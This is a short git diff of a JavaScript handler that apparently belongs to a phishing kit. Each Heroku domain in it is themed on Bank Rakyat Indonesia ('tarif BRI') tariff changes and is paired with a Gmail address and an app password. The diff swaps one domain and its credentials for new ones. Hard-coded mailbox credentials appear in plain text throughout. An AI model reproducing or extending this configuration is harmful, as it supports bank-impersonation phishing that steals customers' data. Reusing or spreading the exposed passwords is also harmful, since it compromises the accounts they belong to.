@@ -13,10 +13,10 @@ export default function handler(req, res) {
        pass = 'ayprohbtgmffqfao'
     }else
     
-  if (url == 'pilihan-tarif-bri-terbaru.herokuapp.com'){
+  if (url == 'info-terbaru-tarif-bri.herokuapp.com'){
 
-       email = 'sumberjaya62022@gmail.com'
-       pass = 'lmvazofxrvmypcwc'
+       email = 'diganggutolongjangan@gmail.com'
+       pass = 'bddgmtqysrplcakf'
     }else
         
   if (url == 'pilih-tarif-bri-baru.herokuapp.com'){
